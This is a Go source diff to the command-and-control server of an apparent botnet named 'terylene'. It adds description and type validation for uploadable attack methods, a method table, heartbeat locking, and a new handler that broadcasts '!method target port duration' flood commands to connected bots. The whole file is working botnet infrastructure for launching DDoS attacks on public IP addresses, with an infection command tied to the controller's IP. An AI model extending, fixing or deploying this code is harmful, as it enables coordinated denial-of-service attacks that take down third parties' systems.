@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"errors"
 	"fmt"
 	"io"
 	"log"
@@ -22,6 +23,8 @@ import (
 	poly "terylene/server/theme/default"
 	"time"
 
+	tablewriter "github.com/olekukonko/tablewriter"
+
 	"github.com/fatih/color"
 	zmq "github.com/pebbe/zmq4"
 )
@@ -37,10 +40,12 @@ type Botstruc struct {
 }
 
 type Method struct {
-	name         string
-	path         string
-	flag_entries []methflag
-	rawformat    string
+	name          string
+	description   string
+	path          string
+	flag_entries  []methflag
+	displayformat string
+	rawformat     string
 }
 
 type methflag struct {
@@ -63,6 +68,7 @@ func isValidType(t string) bool {
 		"ip":     true,
 		"port":   true,
 		"int":    true,
+		"uint":   true,
 	}
 
 	return validTypes[t]
@@ -70,6 +76,7 @@ func isValidType(t string) bool {
 
 var (
 	//DONT change any of these
+	Allmethods     = poly.AllMethods
 	connIDs        = make(map[string]string)
 	tera           = make(map[string]Botstruc)
 	aliveclient    = make(map[string]time.Time)
@@ -78,6 +85,7 @@ var (
 	start          = time.Now()
 	pubmutex       sync.Mutex
 	routmutex      sync.Mutex
+	alivemutex     sync.RWMutex
 )
 
 func broadcaster(message []string, publisher *zmq.Socket) {
@@ -106,6 +114,7 @@ func heartpubsend(publisher *zmq.Socket) {
 
 func heartbeatcheck() {
 	for {
+		alivemutex.RLock()
 		for id, last := range aliveclient {
 			if time.Since(last) > 5*time.Second {
 				delete(aliveclient, id)
@@ -114,6 +123,7 @@ func heartbeatcheck() {
 				fmt.Printf("\n\033[1;33mheartbeat monitor: terylene %s has been pronounced dead\033[0m", id)
 			}
 		}
+		alivemutex.RUnlock()
 		time.Sleep(3 * time.Second)
 	}
 }
@@ -194,7 +204,9 @@ func routerhandle(router *zmq.Socket) {
 
 			if len(msg) == 2 {
 				if msg[1] == "h" {
+					alivemutex.Lock()
 					aliveclient[msg[0]] = time.Now()
+					alivemutex.Unlock()
 				} else if msg[1] == "injustice" {
 					routmutex.Lock()
 					router.SendMessage(msg[0], "justice")
@@ -481,6 +493,11 @@ func uploadmethod(meth Method, pub *zmq.Socket) {
 	file, err := os.Open(filePath)
 	name := meth.name
 	fileInfo, err := os.Stat(filePath)
+	usageformat := []string{fmt.Sprintf("!%s", meth.name)}
+
+	for _, flagEntry := range meth.flag_entries {
+		usageformat = append(usageformat, "<"+flagEntry.entry+">")
+	}
 
 	if err != nil {
 		log.Println(err)
@@ -519,21 +536,30 @@ func uploadmethod(meth Method, pub *zmq.Socket) {
 	}
 
 	pubmutex.Lock()
-	pub.SendMessage("terylene", "file_end", name, meth.rawformat)
+	pub.SendMessage("terylene", "file_end", meth.name, meth.rawformat)
 	pubmutex.Unlock()
+
+	meth.displayformat = strings.Join(usageformat, " ")
+
+	fmt.Println(meth.displayformat)
 
 	custom_methods = append(custom_methods, meth)
 	fmt.Println("upload finished")
+
+	Allmethods = append(Allmethods, []string{meth.name, meth.description, strings.Join(usageformat, " ")})
+	fmt.Println(Allmethods)
 }
 
 func addmethod(method string, publisher *zmq.Socket) {
+
+	clearScreen()
 	scanner := bufio.NewScanner(os.Stdin)
 
 	var meth Method
 
-	for _, custom := range config.Methods {
-		if custom == method {
-			color.Red("conflicting method name with builtin name: %s\n", custom)
+	for _, value := range Allmethods {
+		if value[0] == method {
+			color.Red("conflicting method name with builtin name: %s\n", value[0])
 			return
 		}
 	}
@@ -544,8 +570,10 @@ func addmethod(method string, publisher *zmq.Socket) {
 		fmt.Print("method path:")
 		scanner.Scan()
 		mpath := scanner.Text()
+		mpath = strings.TrimSpace(mpath)
 
 		if mpath == "exit" {
+			clearScreen()
 			return
 		}
 
@@ -562,19 +590,35 @@ func addmethod(method string, publisher *zmq.Socket) {
 		}
 	}
 
+	fmt.Print("description:")
+	scanner.Scan()
+	description := scanner.Text()
+	description = strings.TrimSpace(description)
+
+	if description == "exit" {
+		return
+	}
+
+	meth.description = description
+
+	color.Green("input the format to execute this method (example: ./$main::string $target::ip $port::port $duration::int)")
+
 	for {
-		ifmain := false
-		color.Green("input the format to execute this method (example: ./$main::string $target::ip $port::port $time::int)")
 		fmt.Print("format:")
 
 		scanner.Scan()
 		format := scanner.Text()
+		format = strings.TrimSpace(format)
 
 		if format == "exit" {
 			return
 		}
 
 		var flags []methflag
+		seen := make(map[string]bool)
+		ifdup := false
+		ifmain := false
+		ifinvalid := false
 
 		pattern := "\\$([a-zA-Z]+)::([a-zA-Z]+)"
 		re := regexp.MustCompile(pattern)
@@ -588,12 +632,31 @@ func addmethod(method string, publisher *zmq.Socket) {
 
 		for _, match := range matches {
 			fmt.Println(match)
+
 			if match[1] == "main" {
 				ifmain = true
+				continue
+			}
+
+			if seen[match[1]] {
+				color.Red("duplication value detected:%s", match[1])
+				ifdup = true
+				break
+			} else {
+				seen[match[1]] = true
+			}
+
+			if !isValidType(match[2]) {
+				color.Red("invalid type '%s' for %s entry", match[2], match[1])
+				ifinvalid = true
+				break
 			}
 
 			flags = append(flags, methflag{entry: match[1], entrytype: match[2]})
+		}
 
+		if ifdup || ifinvalid {
+			continue
 		}
 
 		if ifmain == false {
@@ -603,8 +666,6 @@ func addmethod(method string, publisher *zmq.Socket) {
 
 		meth.rawformat = format
 		meth.flag_entries = flags
-
-		custom_methods = append(custom_methods, meth)
 
 		fmt.Println(meth)
 		break
@@ -624,6 +685,108 @@ func addmethod(method string, publisher *zmq.Socket) {
 	}
 }
 
+func valuecheck(value string, valuetype string) error {
+	switch valuetype {
+	case "string":
+		return nil
+	case "ip":
+		out := net.ParseIP(value) != nil
+		if out {
+			return nil
+		} else {
+			return errors.New(fmt.Sprintf("%s is not an ip", value))
+		}
+	case "port":
+		num, err := strconv.ParseUint(value, 10, 16)
+		if err != nil {
+			return errors.New(fmt.Sprintf("%s is not a valid port range", value))
+		}
+		// Check if the parsed number is within the range of uint8
+		if num >= 0 && num <= 65535 {
+			return nil
+		}
+		return errors.New(fmt.Sprintf("%s is not a valid port range", value))
+	case "int":
+		_, err := strconv.ParseInt(value, 10, 64)
+		if err != nil {
+			return errors.New("integer overflow detected")
+		}
+		return nil
+	case "uint":
+		_, err := strconv.ParseUint(value, 10, 64)
+		if err != nil {
+			return errors.New("integer overflow detected")
+		}
+		return nil
+	default:
+		return errors.New(fmt.Sprintf("unknown value type: %s", valuetype))
+	}
+}
+
+func methodsendhandler(command string, publisher *zmq.Socket) {
+	parts := strings.Fields(command)
+	if len(parts) > 0 {
+		if strings.HasPrefix(parts[0], "!") {
+			containsBlocked := false
+			//check if the method is builtin
+			for _, value := range config.Methods {
+				if parts[0] == ("!" + value) {
+					for _, block := range config.Blocked {
+						if strings.Contains(command, block) {
+							containsBlocked = true
+						}
+					}
+					if containsBlocked {
+						return
+					}
+
+					if len(parts) == 4 {
+						if !isPublicIPv4(parts[1]) {
+							color.Red("%s is not a public ip", parts[1])
+							continue
+						}
+						_, err := strconv.Atoi(parts[2])
+						if err != nil {
+							color.Red("%s port is not integer", parts[2])
+							continue
+						}
+						_, err = strconv.Atoi(parts[3])
+						if err != nil {
+							color.Red("%s duration is not integer", parts[3])
+							continue
+						}
+						broadcaster([]string{"terylene", command}, publisher)
+						clearScreen()
+						fmt.Println(poly.Ddosmsg)
+						return
+					} else {
+						fmt.Println("!" + fmt.Sprintf("%s <target> <port> <duration>", value))
+						return
+					}
+				}
+			}
+
+			for _, value := range custom_methods {
+				if parts[0] == ("!" + value.name) {
+					for _, block := range config.Blocked {
+						if strings.Contains(command, block) {
+							containsBlocked = true
+						}
+
+						if containsBlocked {
+							return
+						}
+
+						if (len(parts) - 1) != len(value.flag_entries) {
+							fmt.Println(value.displayformat)
+						}
+
+					}
+				}
+			}
+		}
+	}
+}
 func main() {
 	scanner := bufio.NewScanner(os.Stdin)
 
@@ -699,7 +862,19 @@ func main() {
 			color.Red("[✔] successfully shutdown router")
 			os.Exit(1)
 		case "methods":
-			fmt.Printf(strings.TrimLeft(poly.Methods, "\n"))
+			table := tablewriter.NewWriter(os.Stdout)
+			table.SetHeader([]string{"Methods", "descriptions", "formats"})
+
+			table.SetHeaderColor(
+				tablewriter.Colors{tablewriter.FgHiCyanColor, tablewriter.BgMagentaColor},
+				tablewriter.Colors{tablewriter.FgHiCyanColor, tablewriter.BgMagentaColor},
+				tablewriter.Colors{tablewriter.FgHiCyanColor, tablewriter.BgMagentaColor},
+			)
+
+			for _, v := range Allmethods {
+				table.Append(v)
+			}
+			table.Render() // Send output
 		case "list":
 			fmt.Println("Number of bots:", len(aliveclient))
 			if len(aliveclient) != 0 {
@@ -716,41 +891,7 @@ func main() {
 			}
 			fmt.Println(fmt.Sprintf(config.Infcommand, config.C2ip))
 		default:
-			if strings.Contains(command, "!") {
-				containsBlocked := false
-				for _, value := range config.Methods {
-					if strings.Contains(command, value) {
-						for _, block := range config.Blocked {
-							if strings.Contains(command, block) {
-								containsBlocked = true
-							}
-						}
-						if containsBlocked {
-							break
-						}
-						parts := strings.Fields(command)
-						if len(parts) == 4 {
-							if !isPublicIPv4(parts[1]) {
-								continue
-							}
-							_, err := strconv.Atoi(parts[2])
-							if err != nil {
-								continue
-							}
-							_, err = strconv.Atoi(parts[3])
-							if err != nil {
-								continue
-							}
-							broadcaster([]string{"terylene", command}, publisher)
-							clearScreen()
-							fmt.Println(poly.Ddosmsg)
-						} else {
-							fmt.Println("format: !<method> <target> <port> <duration>")
-						}
-						break
-					}
-				}
-			}
+			methodsendhandler(command, publisher)
 		}
 	}
 }
